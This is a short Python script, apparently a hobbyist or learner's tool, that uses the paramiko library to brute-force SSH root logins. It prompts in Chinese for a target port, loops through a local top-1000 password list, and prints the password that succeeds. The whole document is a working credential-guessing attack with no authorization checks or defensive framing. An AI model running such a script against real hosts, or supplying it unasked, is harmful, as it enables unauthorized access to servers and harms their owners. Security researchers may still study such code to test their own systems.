import paramiko
import os
def connect(ips):
    ip=ips
    scans=input('请输入您需要爆破的主机的端口号:')
    scans=int(scans)
    with open('/home/frost/桌面/python/basic_scan/password-top1000.txt','r')as fp:
    # with open('./password-top1000.txt')as fp:
        passwords=fp.readlines()
        for password in passwords:
            password=password.strip()
            try:
                transport=paramiko.Transport((f'{ip}',scans))
                transport.connect(username='root',password=password)
                print(f"登陆成功，密码为：{password}")
                break
            except:
                pass
